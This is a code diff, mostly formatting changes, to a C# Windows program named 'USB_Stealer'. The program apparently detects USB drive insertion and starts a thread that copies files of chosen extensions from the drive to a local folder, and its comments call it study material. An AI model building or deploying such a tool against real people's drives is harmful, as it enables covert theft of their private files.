@@ -3,14 +3,11 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
-
-using System.IO;
 using System.Threading;
-using Microsoft.Win32;
+using System.Windows.Forms;
 
 namespace USB_Stealer
 {
@@ -107,7 +104,7 @@ namespace USB_Stealer
         /// https://blog.csdn.net/Sayesan/article/details/84340588 。
         /// 本软件及其代码仅供学习交流使用
         /// </summary>
-      
+
         // 消息常量声明
         public const int WM_DEVICECHANGE = 0x219;//通知应用程序更改设备或计算机的硬件配置。
         public const int DBT_DEVICEARRIVAL = 0x8000;//U盘插入
@@ -150,15 +147,15 @@ namespace USB_Stealer
                                     // 这段乱得要死而且实现方法太笨了，之后要改
                                     List<string> ULogicalNames = new List<string>();
                                     var IULogicalNames = from LogicalDriver in Directory.GetLogicalDrives()
-                                                        where LogicalDriver == UDeskName
-                                                       select new System.IO.DriveInfo(LogicalDriver).VolumeLabel;
+                                                         where LogicalDriver == UDeskName
+                                                         select new System.IO.DriveInfo(LogicalDriver).VolumeLabel;
                                     foreach (string ULogicalName in IULogicalNames)
                                     {
                                         ULogicalNames.Add(ULogicalName);
                                         ConsoleSendOut($"开始扫描： { ULogicalName }");
                                     }
 
-                                    string[] para = new string[] { UDeskName, PathTo,  ULogicalNames[0]};
+                                    string[] para = new string[] { UDeskName, PathTo, ULogicalNames[0] };
                                     Thread t = new Thread(new ParameterizedThreadStart(CopyMethod));
                                     t.Start(para);
                                     break;
@@ -396,7 +393,7 @@ namespace USB_Stealer
             public static string extList2String()
             {
                 string extListString = string.Empty;
-                extListString = string.Join(";",extList);
+                extListString = string.Join(";", extList);
                 return extListString;
             }
 
@@ -430,7 +427,8 @@ namespace USB_Stealer
         // 输出配置
         private void Opition2Files()
         {
-            try{
+            try
+            {
                 // 我是傻逼，这里看了大半天没看出来一个超级简单的问题
                 string opitionTxtPath = @"UsbStealer.opt";
                 FileStream opitionTxtStream = new FileStream(opitionTxtPath, FileMode.OpenOrCreate, FileAccess.Write);
@@ -442,7 +440,7 @@ namespace USB_Stealer
                 opitionTxtStream.Flush();
                 opitionTxtStream.Close();
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 ConsoleSendOut($"保存配置发生错误：{ex}");
             }
